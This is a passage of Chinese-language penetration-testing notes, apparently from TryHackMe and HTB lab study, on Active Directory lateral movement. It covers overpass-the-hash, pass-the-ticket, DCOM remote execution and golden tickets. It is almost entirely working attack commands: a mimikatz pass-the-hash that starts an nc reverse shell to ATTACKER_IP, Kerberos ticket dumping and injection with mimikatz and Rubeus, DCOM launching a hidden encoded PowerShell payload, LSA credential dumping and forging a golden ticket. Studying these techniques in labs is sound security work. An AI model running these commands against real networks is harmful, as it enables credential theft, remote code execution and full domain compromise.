mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
>在tryhackme的範例中，最後一行指令打出來就會拿到reverse shell了
### 擴散方法
>[!重點]
> jen是目標用戶，也就是可以登入的用戶 ，嘗試存取\\files04之後，就代表已經拿到krbtgt了，既然拿到TGT，就代表可以存取該主機。
* 確認可以存取files04
``` cmd
net use \\files04 
klist 
```
* 利用PsExec進入主機files04
``` cmd
.\PsExec.exe \\files04 cmd
```
## Pass the Ticket
>[!warning] 小節重點
>想定為如果本機殘存TGT/TGS，那就可以把他們拉戳來做類似pass the hash的事情

> mimikatz.exe可以把memory中所有的TGT\TGS匯出，然後匯入klist，就可以用了。
### mimikatz.exe產出TGT\TGS
- 匯出TGT\TGS (匯出會放在同意個資料夾內)
```
sekurlsa::tickets /export
```
- 匯入klist
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
### Rubeus 的相關指令
- 匯出TGT\TGS 
```
Rubeus.exe dump /nowrap
```
- 匯入klist
```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
- 製作並匯入klist
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
>在成功匯入TGT之後，直接輸入`powershell`可以做到PowerShell Remoting
## DCOM
- 建立dcom物件
``` powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```
- 建立於遠端的process
``` powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
- 建立於遠端的process(reverse)
``` powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD==","7")
```
## Golden Ticket
>[!warning ] 小節重點
>當使用者送出一個TGT的request，KDC會使用krbtgt的password hash來幫TGT加密，所以如果知道krbtgt的password hash，那就可以自己製作golden tickets。

>[!warning ] prerequest
>- 拿下一個domain admin帳戶
>- compromised the domain controller itself

- 用mimikatz撈出記憶體內資料
```
lsadump::lsa /patch
```
- 刪除既有的Kerberos tickets
```
kerberos::purge
```
- 製作金票眷
```
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```